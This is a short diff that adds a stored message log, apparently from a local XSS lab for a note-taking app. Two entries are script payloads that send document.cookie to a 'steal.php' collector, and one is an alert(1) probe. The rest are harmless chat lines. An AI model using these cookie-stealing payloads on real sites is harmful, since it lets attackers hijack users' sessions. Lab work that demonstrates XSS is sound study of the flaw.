@@ -1,0 +1,11 @@
+<strong>attacker:</strong> <script>
+  fetch("http://localhost/cloud_based_note_app/xss/xss-attacker/steal.php?cookie=" + document.cookie)
+</script>
+<br>
+<strong>victim:</strong> <script>
+  fetch("http://localhost/cloud_based_note_app/xss/xss-attacker/steal.php?cookie=" + document.cookie)
+</script>
+<br>
+<strong>victim:</strong> <script>alert(1)</script><br>
+<strong>victim:</strong> hello<br>
+<strong>victim:</strong> hi<br>
